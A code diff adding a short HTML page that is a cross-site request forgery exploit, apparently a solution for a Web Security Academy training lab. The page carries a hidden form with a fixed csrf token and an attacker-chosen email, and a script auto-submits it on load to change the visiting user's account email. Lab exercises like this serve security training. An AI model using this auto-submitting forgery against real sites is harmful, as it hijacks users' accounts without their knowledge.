@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form
+      name="change-email-form"
+      action="https://0ab800e5032e0a75832ff564007300d8.web-security-academy.net/my-account/change-email"
+      method="POST"
+    >
+      <label>Email</label>
+      <input type="email" name="email" value="hacked11111@gmail.com" />
+      <input
+        type="hidden"
+        name="csrf"
+        value="4CjSrVXxeY1QzeETVWGYvTruJRs1Y4ff"
+      />
+      <button class="button" type="submit">Update email</button>
+    </form>
+
+    <script type="text/javascript">
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
